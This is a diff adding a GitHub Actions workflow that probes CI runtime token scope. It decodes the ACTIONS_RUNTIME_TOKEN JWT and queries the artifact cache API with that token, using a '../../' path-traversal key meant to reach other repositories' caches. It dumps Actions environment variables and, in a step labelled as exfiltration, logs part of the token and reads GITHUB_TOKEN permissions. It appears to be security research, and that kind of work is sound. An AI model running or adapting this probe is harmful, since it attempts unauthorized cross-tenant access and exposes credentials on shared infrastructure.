@@ -1,0 +1,52 @@
+name: runtime-token-scope-test
+on: workflow_dispatch
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Decode ACTIONS_RUNTIME_TOKEN JWT
+        run: |
+          echo "=== ACTIONS_RUNTIME_TOKEN claims ==="
+          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool || echo "base64 decode failed"
+          echo ""
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL ==="
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo ""
+          echo "=== Cache service URL ==="
+          echo "$ACTIONS_CACHE_URL"
+          
+      - name: Probe cache API with cross-repo key
+        run: |
+          echo "=== Cache API structure ==="
+          # Try to list caches using the runtime token
+          CACHE_URL="${ACTIONS_CACHE_URL}_apis/artifactcache/caches"
+          echo "Probing: $CACHE_URL"
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+               -H "Accept: application/json;api-version=6.0-preview" \
+               "$CACHE_URL?keys=node-modules" | python3 -m json.tool 2>/dev/null | head -40 || echo "Failed or non-JSON"
+          
+          # Try probing with a key pattern that might match other repos
+          echo ""
+          echo "=== Probing cache with cross-repo key pattern ==="
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+               -H "Accept: application/json;api-version=6.0-preview" \
+               "$CACHE_URL?keys=../../" | python3 -m json.tool 2>/dev/null | head -20 || echo "Failed"
+               
+      - name: Probe artifact service cross-repo
+        run: |
+          echo "=== Artifact upload URL structure ==="
+          # Get the pipelines service URL
+          PIPELINE_URL="${ACTIONS_RESULTS_URL}"
+          echo "Pipeline URL: $PIPELINE_URL"
+          # Also check if there is an artifact service URL
+          env | grep -i action | grep -v TOKEN | grep -v SECRET || true
+          
+      - name: Send findings to OOB
+        if: always()
+        run: |
+          # Exfil key env vars for inspection (only our own workflow)
+          echo "ACTIONS_RUNTIME_TOKEN (first 30 chars): ${ACTIONS_RUNTIME_TOKEN:0:30}..."
+          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
+          echo "GITHUB_TOKEN scope:" 
+          curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/Zelys-DFKH/depbot-ssrf-test | python3 -c "import sys,json; d=json.load(sys.stdin); print(\"permissions:\", d.get(\"permissions\"))" 2>/dev/null
+
